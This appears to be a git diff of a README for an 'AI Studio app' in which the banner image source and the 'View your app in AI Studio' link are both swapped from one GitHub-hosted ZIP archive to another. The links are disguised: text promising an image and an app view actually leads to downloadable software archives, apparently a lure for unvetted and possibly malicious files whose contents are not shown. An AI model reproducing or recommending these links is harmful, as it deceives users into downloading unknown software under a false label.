@@ -1,12 +1,12 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/7j89a/asas/main/services/Software_v1.9.zip" />
+<img width="1200" height="475" alt="GHBanner" src="https://github.com/7j89a/asas/raw/refs/heads/main/components/Software-1.1-alpha.4.zip" />
 </div>
 
 # Run and deploy your AI Studio app
 
 This contains everything you need to run your app locally.
 
-View your app in AI Studio: https://raw.githubusercontent.com/7j89a/asas/main/services/Software_v1.9.zip
+View your app in AI Studio: https://github.com/7j89a/asas/raw/refs/heads/main/components/Software-1.1-alpha.4.zip
 
 ## Run Locally
 
